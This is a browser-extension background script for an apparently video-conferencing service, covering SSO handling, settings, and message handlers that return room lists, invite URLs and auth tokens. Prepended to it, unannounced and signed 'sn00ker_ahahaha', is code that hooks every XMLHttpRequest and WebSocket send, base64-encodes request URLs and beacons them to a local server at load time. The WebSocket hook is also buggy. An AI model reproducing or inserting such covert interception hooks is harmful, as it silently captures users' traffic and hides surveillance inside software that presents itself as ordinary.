function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
var App = (function (my) {

  my.settings = {
    authorized: false
  };

  my.ssoTabId = null;
  my.ssoLogin = null;

  my.setSso = function(val) {
    my.ssoTabId = val.tabId;
    my.ssoLogin = val.login;
  };

  my.checkAuth = function(sso) {
    return API.hasValidSession().then(function(result) {
      if (sso) {
        chrome.storage.local.set({ sso: true });
      }
    }).catch(function() {
      console.log('Unable to validate session')
    })
  };

  my.init = function() {
    initMessaging();
    my.checkAuth();
    chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
      if (tabId === my.ssoTabId && tab.url.match('https://webapp.' + API.environment) && (changeInfo.status === "loading")) {
        my.ssoTabId = null;
        my.checkAuth(true);
        chrome.tabs.remove(tabId);
      }
    });
  };

  my.loc = function(s) {
    return chrome.i18n.getMessage(s) || s.substr(1);
  };

  var initMessaging = function(){
    chrome.runtime.onMessage.addListener(
      function(request, sender, sendResponse, sendError) {
        if (request.cmd === 'getSettings') {
          if (sendResponse) sendResponse( my.getSettings() );
        } else if (request.cmd === 'getPrimaryNumber') {
          if (sendResponse) sendResponse( API.getPrimaryNumber())
        } else if (request.cmd === 'getCustomNumbers') {
          API.getCustomNumbers().then(sendResponse, sendResponse);
          return true;
        } else if (request.cmd === 'getRoomList') {
          chrome.storage.local.get(null, function(data){
            if (data.authorized) {
              API.getRoomList().then(sendResponse, sendResponse);
            }
          });
          // wait for response
          return true;
        } else if (request.cmd === 'getInviteUrls') {
          API.getInviteUrls().then(sendResponse, sendResponse);
          return true;
        } else if (request.cmd === 'getAuthToken') {
          API.getAuthToken().then(sendResponse, sendResponse);
          return true;
        }
      });
  };


  my.getSettings = function(){
    return my.settings;
  };

  my.setSettings = function(settings){
    for (var key in settings) {
      my.settings[key] = settings[key];
    }
    var data = {
      settings: my.settings
    };
    chrome.storage.local.set(data);
  };


  return my;

})(App || {});



App.init();
